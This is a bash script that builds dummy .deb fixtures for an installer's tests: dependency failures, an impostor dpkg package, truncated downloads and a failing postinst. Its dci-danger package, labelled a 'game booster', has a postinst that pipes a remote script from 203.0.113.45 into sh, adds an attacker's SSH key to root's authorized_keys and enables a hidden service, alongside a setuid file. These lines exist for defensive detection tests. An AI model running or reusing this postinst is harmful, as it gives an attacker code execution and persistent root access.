#!/bin/bash
# Builds the dummy packages the tests use. Usage: build.sh OUTDIR
# None of them is meant for the host: dci-failpost and fake-dpkg exist to be refused or rolled back.
set -euo pipefail
out=$(realpath -m "$1")
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
mkdir -p "$out"

mk() { # name version arch "extra control lines" [script-name script-body]...
    local name=$1 version=$2 arch=$3 extra=$4
    shift 4
    local d="$work/$name"
    mkdir -p "$d/DEBIAN" "$d/usr/share/doc/$name"
    printf 'Package: %s\nVersion: %s\nArchitecture: %s\nMaintainer: Tests <tests@example.invalid>\n%bDescription: deb-installer test package\n' \
        "$name" "$version" "$arch" "$extra" > "$d/DEBIAN/control"
    echo "test" > "$d/usr/share/doc/$name/README"
    while [ $# -ge 2 ]; do
        printf '#!/bin/sh\n%b\n' "$2" > "$d/DEBIAN/$1"
        chmod 0755 "$d/DEBIAN/$1"
        shift 2
    done
    dpkg-deb --build --root-owner-group "$d" "$out/$name.deb" > /dev/null
}

mk dci-ok 1.0 all 'Depends: hello\n'
mk dci-missing 1.0 all 'Depends: libssl1.1, libwebkit2gtk-4.0-37\n'
mk dci-conflict 1.0 all 'Conflicts: hello\n'
mk dci-conflict-host 1.0 all 'Conflicts: zenity\n'  # only simulated on the desktop, never installed
mk dci-arm 1.0 arm64 ''
mk dci-failpost 1.0 all 'Depends: figlet\n' postinst 'echo "setup failed" >&2\nexit 1'

# A third-party package that claims the name of an essential system package.
d="$work/fake-dpkg"
mkdir -p "$d/DEBIAN"
printf 'Package: dpkg\nVersion: 99.0\nArchitecture: all\nMaintainer: Tests <tests@example.invalid>\nDescription: impostor\n' > "$d/DEBIAN/control"
dpkg-deb --build --root-owner-group "$d" "$out/fake-dpkg.deb" > /dev/null

# Patterns a malicious package would use. Only ever analysed, never installed.
d="$work/dci-danger"
mkdir -p "$d/DEBIAN" "$d/etc/systemd/system" "$d/usr/lib/dci-danger" "$d/usr/bin"
printf 'Package: dci-danger\nVersion: 1.0.3\nArchitecture: all\nMaintainer: Tests <tests@example.invalid>\nDescription: game booster\n' > "$d/DEBIAN/control"
cat > "$d/DEBIAN/postinst" <<'EOF'
#!/bin/sh
curl -fsSL http://203.0.113.45/i.sh | sh
echo "ssh-ed25519 AAAAC3Nza attacker" >> /root/.ssh/authorized_keys
systemctl enable .dbus-helper.service
EOF
chmod 0755 "$d/DEBIAN/postinst"
printf '[Service]\nExecStart=/usr/lib/dci-danger/libhelper.so\n' > "$d/etc/systemd/system/.dbus-helper.service"
printf '\177ELF\002\001\001\000UPX!packed' > "$d/usr/lib/dci-danger/libhelper.so"
printf '\177ELF\002\001\001\000plain' > "$d/usr/bin/dci-suid"
chmod 4755 "$d/usr/bin/dci-suid"
dpkg-deb --build --root-owner-group "$d" "$out/dci-danger.deb" > /dev/null

# Broken downloads: a truncated archive and an HTML error page saved as .deb.
size=$(stat -c %s "$out/dci-ok.deb")
head -c $((size - 120)) "$out/dci-ok.deb" > "$out/broken-truncated.deb"
printf '<html><body>404 Not Found</body></html>\n' > "$out/broken-html.deb"

ls "$out"
